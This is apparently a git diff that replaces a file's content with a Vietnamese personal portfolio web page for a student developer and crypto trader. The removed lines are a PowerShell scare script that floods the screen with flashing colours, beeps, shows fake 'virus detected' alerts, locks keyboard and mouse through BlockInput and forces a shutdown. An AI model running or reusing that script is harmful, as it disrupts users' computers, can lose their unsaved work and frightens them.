@@ -1,56 +1,251 @@
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Tuấn Dev | Trader, Học Sinh & Nhà Sáng Tạo</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
 
-function Start-FullScreenGlitch {
-    $form = New-Object Windows.Forms.Form
-    $form.WindowState = 'Maximized'
-    $form.FormBorderStyle = 'None'
-    $form.TopMost = $true
-    $form.BackColor = 'Black'
-    $form.ShowInTaskbar = $false
-    $graphics = $form.CreateGraphics()
-    $colors = @([Drawing.Color]::Red, [Drawing.Color]::White, [Drawing.Color]::Black, [Drawing.Color]::Lime)
+<!-- Thanh điều hướng -->
+<nav class="navbar navbar-expand-lg navbar-dark fixed-top">
+  <div class="container">
+    <a class="navbar-brand" href="#">
+      <i class="bi bi-terminal-fill"></i> Tuấn<span class="text-accent">Dev</span>
+    </a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNav">
+      <ul class="navbar-nav ms-auto">
+        <li class="nav-item"><a class="nav-link active" href="#">Giới Thiệu</a></li>
+        <li class="nav-item"><a class="nav-link" href="#skills">Kỹ Năng</a></li>
+        <li class="nav-item"><a class="nav-link" href="#projects">Dự Án</a></li>
+        <li class="nav-item"><a class="nav-link" href="#trading">Giao Dịch</a></li>
+        <li class="nav-item"><a class="nav-link" href="#contact">Liên Hệ</a></li>
+      </ul>
+    </div>
+  </div>
+</nav>
 
-    $timer = New-Object Windows.Forms.Timer
-    $timer.Interval = 50
-    $timer.Add_Tick({
-        $brush = New-Object Drawing.SolidBrush (Get-Random -InputObject $colors)
-        $graphics.FillRectangle($brush, 0, 0, $form.Width, $form.Height)
-    })
+<!-- Phần giới thiệu -->
+<header class="hero">
+  <div class="container">
+    <div class="row align-items-center">
+      <div class="col-lg-6 text-center text-lg-start mb-5 mb-lg-0">
+        <h1 class="display-4 fw-bold animate__animated animate__fadeInUp">Tôi là Tuấn</h1>
+        <p class="lead my-4 animate__animated animate__fadeInUp animate__delay-1s">
+          Một học sinh trẻ tuổi, đam mê công nghệ và tài chính. Tôi là một lập trình viên tự học và nhà giao dịch tiền mã hóa đang xây dựng tương lai bằng chính đôi tay mình.
+        </p>
+        <div class="animate__animated animate__fadeInUp animate__delay-2s">
+          <a href="#projects" class="btn btn-primary btn-lg me-2">Xem Dự Án</a>
+          <a href="#contact" class="btn btn-outline-light btn-lg">Liên Hệ</a>
+        </div>
+      </div>
+      <div class="col-lg-6 animate__animated animate__fadeIn animate__delay-1s">
+        <img src="./imagess/output.jpg" alt="Ảnh Tuấn dev/trader" class="img-fluid rounded-4 hero-image" />
+      </div>
+    </div>
+  </div>
+  <div class="hero-shape"></div>
+</header>
+<!-- Giới thiệu bản thân -->
+<section class="stats py-4 bg-light">
+  <div class="container">
+    <div class="row text-center">
+      <div class="col-md-4 mb-3 mb-md-0">
+        <div class="stat-item">
+          <h3 class="stat-number"><span class="counter">5,000</span>+</h3>
+          <p class="stat-text">Giờ Lập Trình</p>
+        </div>
+      </div>
+      <div class="col-md-4 mb-3 mb-md-0">
+        <div class="stat-item">
+          <h3 class="stat-number"><span class="counter">120</span>+</h3>
+          <p class="stat-text">Dự Án Cá Nhân & Team</p>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="stat-item">
+          <h3 class="stat-number"><span class="counter">8</span>+</h3>
+          <p class="stat-text">Năm Theo Dõi Thị Trường Crypto</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+<section id="how-it-works" class="py-5">
+  <div class="container">
+    <div class="section-header text-center mb-5">
+      <span class="section-subtitle">Hành Trình Học Tập</span>
+      <h2 class="section-title">Tôi Đã Bắt Đầu Như Thế Nào</h2>
+      <p class="section-description">Từ chiếc máy tính cũ và vài dòng code đầu tiên, tôi đã tự học và từng bước xây dựng năng lực đa ngành: lập trình, AI, crypto.</p>
+    </div>
+    <div class="row g-4">
+      <div class="col-md-4">
+        <div class="process-card">
+          <div class="process-icon">
+            <span class="process-number">1</span>
+            <i class="bi bi-book"></i>
+          </div>
+          <h3>Tự Học Kiến Thức Nền</h3>
+          <p>Tôi bắt đầu từ những tài liệu lập trình cơ bản, HTML/CSS rồi tới JavaScript, backend và cả AI cơ bản.</p>
+          <ul class="process-features">
+            <li><i class="bi bi-check-circle-fill"></i> Tự học qua YouTube, tài liệu quốc tế</li>
+            <li><i class="bi bi-check-circle-fill"></i> Không ngừng vọc vạch, sai là sửa</li>
+            <li><i class="bi bi-check-circle-fill"></i> Kỷ luật và tò mò</li>
+          </ul>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="process-card active">
+          <div class="process-icon">
+            <span class="process-number">2</span>
+            <i class="bi bi-graph-up-arrow"></i>
+          </div>
+          <h3>Bước Vào Thị Trường Tài Chính</h3>
+          <p>Tôi theo dõi thị trường tiền mã hóa từ năm cấp 2, tự học phân tích kỹ thuật và quản trị vốn như một nhà đầu tư chuyên nghiệp.</p>
+          <ul class="process-features">
+            <li><i class="bi bi-check-circle-fill"></i> Giao dịch demo, ghi nhật ký lệnh</li>
+            <li><i class="bi bi-check-circle-fill"></i> Theo dõi macro, dòng tiền</li>
+            <li><i class="bi bi-check-circle-fill"></i> Ưu tiên quản trị rủi ro</li>
+          </ul>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="process-card">
+          <div class="process-icon">
+            <span class="process-number">3</span>
+            <i class="bi bi-lightbulb"></i>
+          </div>
+          <h3>Kết Hợp Đa Ngành</h3>
+          <p>Tôi đang xây dựng những dự án giao thoa giữa lập trình, blockchain và AI để tạo ra công cụ hỗ trợ cộng đồng đầu tư hiệu quả hơn.</p>
+          <ul class="process-features">
+            <li><i class="bi bi-check-circle-fill"></i> Viết code tool tài chính</li>
+            <li><i class="bi bi-check-circle-fill"></i> Tự động hóa lệnh & báo cáo</li>
+            <li><i class="bi bi-check-circle-fill"></i> Chia sẻ kiến thức cho người mới</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+<section id="projects" class="planner py-5 bg-dark text-light">
+  <div class="container">
+    <div class="section-header text-center mb-5">
+      <span class="section-subtitle">Một Phần Hành Trình</span>
+      <h2 class="section-title">Các Dự Án Cá Nhân</h2>
+      <p class="section-description">Tôi không ngừng thử nghiệm, xây dựng và cải tiến. Dưới đây là một vài sản phẩm nổi bật tôi đã làm trong quá trình học và làm việc.</p>
+    </div>
+    <div class="row g-4">
+      <div class="col-md-4">
+        <div class="card h-100 bg-secondary text-white border-0">
+          <div class="card-body">
+            <h3 class="card-title">Auto Tracker Crypto</h3>
+            <p class="card-text">Một công cụ theo dõi danh mục coin tự động cập nhật giá, tính lãi/lỗ, hỗ trợ Telegram alert.</p>
+            <ul class="list-unstyled">
+              <li><i class="bi bi-check2-circle"></i> Sử dụng API Binance</li>
+              <li><i class="bi bi-check2-circle"></i> Giao diện đơn giản dễ dùng</li>
+              <li><i class="bi bi-check2-circle"></i> Chạy trên server cá nhân</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="card h-100 bg-secondary text-white border-0">
+          <div class="card-body">
+            <h3 class="card-title">Website học lập trình</h3>
+            <p class="card-text">Nơi tôi chia sẻ những bài học thực tế, hướng dẫn từng bước cho người mới học lập trình.</p>
+            <ul class="list-unstyled">
+              <li><i class="bi bi-check2-circle"></i> Tự thiết kế frontend</li>
+              <li><i class="bi bi-check2-circle"></i> Viết bằng HTML, CSS, JS</li>
+              <li><i class="bi bi-check2-circle"></i> Có hệ thống bài tập và video</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="card h-100 bg-secondary text-white border-0">
+          <div class="card-body">
+            <h3 class="card-title">Phân tích Macro & Cảnh báo FUD</h3>
+            <p class="card-text">Bot AI tự tổng hợp tin tức thị trường, phân tích cảm xúc cộng đồng, cảnh báo sớm về các biến động lớn.</p>
+            <ul class="list-unstyled">
+              <li><i class="bi bi-check2-circle"></i> Xử lý tin tức từ API, RSS</li>
+              <li><i class="bi bi-check2-circle"></i> Phân tích sentiment</li>
+              <li><i class="bi bi-check2-circle"></i> Gửi cảnh báo Telegram</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+<section id="reviews" class="testimonials py-5">
+  <div class="container">
+    <div class="section-header text-center mb-5">
+      <span class="section-subtitle">Cảm Nhận Từ Người Thật</span>
+      <h2 class="section-title">Đánh Giá Từ Bạn Bè & Cộng Đồng</h2>
+      <p class="section-description">Tôi luôn biết ơn sự góp ý, phản hồi và khích lệ từ mọi người trên hành trình phát triển.</p>
+    </div>
+    <div class="row g-4">
+      <div class="col-md-4">
+        <div class="testimonial bg-light p-4 rounded-3 shadow-sm">
+          <p class="mb-3">“Tuấn là người có tư duy khác biệt. Dự án theo dõi thị trường của cậu ấy giúp mình tránh được 2 cú sập lớn trong năm ngoái.”</p>
+          <h5 class="mb-0">Minh (Trader lâu năm)</h5>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="testimonial bg-light p-4 rounded-3 shadow-sm">
+          <p class="mb-3">“Không ngờ một học sinh lại có thể viết tool chạy auto lệnh chuyên nghiệp như vậy. Rất đáng học hỏi.”</p>
+          <h5 class="mb-0">Anh Tín (Dev backend)</h5>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="testimonial bg-light p-4 rounded-3 shadow-sm">
+          <p class="mb-3">“Tuấn giúp mình học HTML/CSS từ con số 0. Website đầu tay của mình có giao diện không tệ lắm là nhờ chỉ dẫn của cậu ấy!”</p>
+          <h5 class="mb-0">Linh (Sinh viên năm nhất)</h5>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- Liên hệ -->
+<section id="contact" class="contact py-5 bg-secondary text-white">
+  <div class="container">
+    <div class="section-header text-center mb-4">
+      <span class="section-subtitle">Kết Nối Với Tôi</span>
+      <h2 class="section-title">Liên Hệ</h2>
+      <p class="section-description">Bạn có thể trao đổi công việc, học lập trình, hay chỉ đơn giản là bàn chuyện thị trường.</p>
+    </div>
+    <div class="row justify-content-center">
+      <div class="col-md-6">
+        <ul class="list-unstyled fs-5">
+          <li><i class="bi bi-telegram text-accent me-2"></i><strong>Telegram:</strong> @TuanTrader</li>
+          <li><i class="bi bi-envelope-fill text-accent me-2"></i><strong>Email:</strong> tuan.devcrypto@gmail.com</li>
+          <li><i class="bi bi-github text-accent me-2"></i><strong>GitHub:</strong> github.com/TuanDevTrader</li>
+          <li><i class="bi bi-geo-alt-fill text-accent me-2"></i><strong>Vị trí:</strong> Việt Nam (UTC+7)</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
 
-    $timer.Start()
-    $form.ShowDialog()
-}
+<!-- Chân trang -->
+<footer class="footer py-4 bg-dark text-light">
+  <div class="container text-center">
+    <p class="mb-1">© 2025 Tuấn | Học sinh - Dev - Trader</p>
+    <p class="small mb-0">Website cá nhân được xây dựng từ HTML/CSS thủ công. Mỗi dòng code là một phần của hành trình trưởng thành.</p>
+  </div>
+</footer>
 
-Start-Job {
-    for ($i = 0; $i -lt 50; $i++) {
-        [console]::beep((Get-Random -Minimum 200 -Maximum 2000), 100)
-        Start-Sleep -Milliseconds 50
-    }
-}
-
-Start-Job { Start-FullScreenGlitch } | Out-Null
-
-for ($i = 0; $i -lt 5; $i++) {
-    Start-Job {
-        [System.Windows.Forms.MessageBox]::Show("💀 ĐÃ PHÁT HIỆN VIRUS. HỆ THỐNG BỊ TẤN CÔNG!", "CRITICAL ERROR", 0, 16)
-    } | Out-Null
-    Start-Sleep -Milliseconds 500
-}
-
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class LockInput {
-    [DllImport("user32.dll")]
-    public static extern bool BlockInput(bool fBlockIt);
-}
-"@
-[LockInput]::BlockInput($true)
-
-for ($i = 5; $i -gt 0; $i--) {
-    Write-Host "🔒 TẤT CẢ BỊ KHÓA. TẮT MÁY TRONG $i GIÂY..." -ForegroundColor Red
-    Start-Sleep -Seconds 1
-}
-
-Stop-Computer -Force
+<!-- Bootstrap JS -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
